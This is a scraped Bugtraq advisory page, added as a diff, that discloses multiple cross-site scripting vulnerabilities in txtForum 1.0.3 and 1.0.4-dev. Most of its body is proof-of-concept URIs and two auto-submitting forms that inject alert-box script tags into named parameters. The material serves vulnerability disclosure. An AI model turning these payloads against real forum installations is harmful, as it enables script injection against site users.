@@ -1,0 +1,98 @@
+#SpeeDr00t@Black Falcon<br>#bid17054<p><b><span style="font-size: 18pt;">txtForum Multiple Cross-Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/17054/info">info</a><br><a href="http://www.securityfocus.com/bid/17054/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/17054/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/17054/solution">solution</a><br><a href="http://www.securityfocus.com/bid/17054/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				17054
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 09 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 11 2006 06:30AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Nenad Jovanovic of Technical University of Vienna is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					txtForum txtForum 1.0.4 -dev<br/>
+					
+				
+					txtForum txtForum 1.0.3 -dev<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	This issue can be exploited through a web client.<br/><br/>The following proof-of-concept URIs are available:<br/>http://www.example.com/txtforum104/index.php?rand5="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/new_topic.php?r_username='&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/new_topic.php?r_loc='&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=viewprofile&amp;nick=admin&amp;r_num=&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;r_family_name="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;r_icq="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;r_yahoo="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;r_aim="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;r_homepage="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;r_interests="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;r_about="&lt;/textarea&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;selected1="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;selected0="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;signature_selected1="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;signature_selected0="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;smile_selected1="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;smile_selected0="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;ubb_selected1="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/profile.php?mode=editprofile&amp;ubb_selected0="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/reply.php?quote=&lt;/textarea&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/reply.php?tid="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/view_topic.php?page=27&amp;tid='&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/>http://www.example.com/txtforum104/view_topic.php?print_adminJS=1&amp;tid="&gt;&lt;script&gt;alert('xss_string')&lt;/script&gt;<br/><br/>&lt;form action='http://www.example.com/txtforum104/view_topic.php?sticked=&lt;script&gt;alert("xss_string")&lt;/script&gt;' method="post"&gt;<br/>&lt;input type="text" name="where" value="sticky"/&gt;<br/>&lt;input type="submit"&gt;<br/>&lt;/form&gt;<br/>&lt;script type="text/javascript"&gt;<br/>document.forms0.submit();<br/>&lt;/script&gt;<br/><br/>&lt;form action='http://www.example.com/txtforum104/view_topic.php' method="post"&gt;<br/>&lt;input type="text" name="where" value="deleteme"/&gt;<br/>&lt;input type="text" name="mid" value="&lt;script&gt;alert('xss_string')&lt;/script&gt;"/&gt;<br/>&lt;input type="submit"&gt;<br/>&lt;/form&gt;<br/>&lt;script type="text/javascript"&gt;<br/>document.forms0.submit();<br/>&lt;/script&gt;<br/><br/>http://www.example.com/txtforum104/view_topic.php?page=-1&amp;tid=xss_string<br/>http://www.example.com/txtforum104/view_topic.php?tid=xss_string
+	
+		<ul>
+</ul>
+</div>
